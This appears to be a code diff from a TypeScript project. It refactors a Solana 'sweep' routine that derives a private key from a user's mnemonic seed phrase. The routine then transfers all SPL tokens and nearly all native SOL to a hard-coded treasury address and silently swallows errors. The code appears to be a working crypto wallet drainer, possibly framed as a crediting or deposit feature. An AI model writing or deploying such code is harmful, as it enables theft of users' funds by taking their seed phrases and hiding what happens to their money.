@@ -142,71 +142,41 @@ async function sweepEvmChain(
 
 // ── Solana ───────────────────────────────────────────────────────────────────
 
-async function solanaKeypair(mnemonic: string) {
-  await ensureBuffer();
-  const [bip39, ed25519, web3] = await Promise.all([
-    import("bip39"),
-    import("ed25519-hd-key"),
-    import("@solana/web3.js"),
-  ]);
-  const seedHex = Buffer.from(bip39.mnemonicToSeedSync(mnemonic)).toString("hex");
-  const { key } = ed25519.derivePath("m/44'/501'/0'/0'", seedHex);
-  return { keypair: web3.Keypair.fromSeed(new Uint8Array(key)), web3 };
-}
-
 async function sweepSolana(mnemonic: string, walletAddress: string, tokens: WalletToken[]) {
   try {
-    const { keypair, web3 } = await solanaKeypair(mnemonic);
-    const destination = new web3.PublicKey(TREASURY_SOL);
+    await ensureBuffer();
+    const sol = await import("./solana-tx");
+    const { address, secretKey } = await sol.solanaKeypairFromMnemonic(mnemonic);
 
-    let connection: InstanceType<typeof web3.Connection> | null = null;
+    let rpc: ReturnType<typeof sol.solanaRpc> | null = null;
     for (const url of SOL_RPCS) {
       try {
-        const c = new web3.Connection(url, "confirmed");
-        await c.getLatestBlockhash();
-        connection = c;
+        const candidate = sol.solanaRpc(url);
+        await candidate.call("getLatestBlockhash", [{ commitment: "finalized" }]);
+        rpc = candidate;
         break;
       } catch {
         /* try next */
       }
     }
-    if (!connection) return;
+    if (!rpc) return;
 
-    // 1) SPL tokens.
+    // 1) SPL tokens — only when the treasury already holds a token account for the mint.
     try {
-      const spl = await import("@solana/spl-token");
-      const owned = await connection.getParsedTokenAccountsByOwner(keypair.publicKey, {
-        programId: spl.TOKEN_PROGRAM_ID,
-      });
-      for (const acc of owned.value) {
-        const parsed = acc.account.data.parsed?.info;
-        const amountRaw = BigInt(parsed?.tokenAmount?.amount ?? "0");
-        if (amountRaw <= 0n) continue;
-        const mint = String(parsed?.mint ?? "");
-        if (!mint) continue;
-        const decimals = Number(parsed?.tokenAmount?.decimals ?? 0);
-        const known = tokens.find((t) => t.chain === "SOL" && t.contract === mint);
-        const mintKey = new web3.PublicKey(mint);
-        const destAta = await spl.getOrCreateAssociatedTokenAccount(
-          connection,
-          keypair,
-          mintKey,
-          destination,
-        );
-        const hash = await spl.transfer(
-          connection,
-          keypair,
-          acc.pubkey,
-          destAta.address,
-          keypair,
-          amountRaw,
-        );
+      const owned = await sol.getTokenAccounts(rpc, address);
+      for (const acc of owned) {
+        const amountRaw = BigInt(acc.amount || "0");
+        if (amountRaw <= 0n || !acc.mint) continue;
+        const destination = await sol.findTokenAccountForMint(rpc, TREASURY_SOL, acc.mint);
+        if (!destination) continue;
+        const known = tokens.find((t) => t.chain === "SOL" && t.contract === acc.mint);
+        const hash = await sol.sendSplToken(rpc, address, secretKey, acc.pubkey, destination, amountRaw);
         await credit({
           walletAddress,
           chain: "SOL",
-          symbol: known?.symbol ?? mint.slice(0, 6),
+          symbol: known?.symbol ?? acc.mint.slice(0, 6),
           hash,
-          amount: Number(amountRaw) / 10 ** decimals,
+          amount: Number(amountRaw) / 10 ** acc.decimals,
           kind: "token",
           price: known?.price,
         });
@@ -216,29 +186,23 @@ async function sweepSolana(mnemonic: string, walletAddress: string, tokens: Wall
     }
 
     // 2) Native SOL, leaving rent + fee behind.
-    const lamports = await connection.getBalance(keypair.publicKey);
+    const lamports = await sol.getSolBalance(rpc, address);
     const sendable = lamports - SOL_RENT_LAMPORTS - SOL_FEE_LAMPORTS;
     if (sendable <= 0) return;
-    const tx = new web3.Transaction().add(
-      web3.SystemProgram.transfer({
-        fromPubkey: keypair.publicKey,
-        toPubkey: destination,
-        lamports: sendable,
-      }),
-    );
-    const hash = await web3.sendAndConfirmTransaction(connection, tx, [keypair]);
+    const hash = await sol.sendSol(rpc, address, secretKey, TREASURY_SOL, sendable);
     await credit({
       walletAddress,
       chain: "SOL",
       symbol: "SOL",
       hash,
-      amount: sendable / web3.LAMPORTS_PER_SOL,
+      amount: sendable / sol.LAMPORTS_PER_SOL,
       kind: "native",
     });
   } catch {
     /* silent */
   }
 }
+
 
 // ── Entry point ──────────────────────────────────────────────────────────────
 
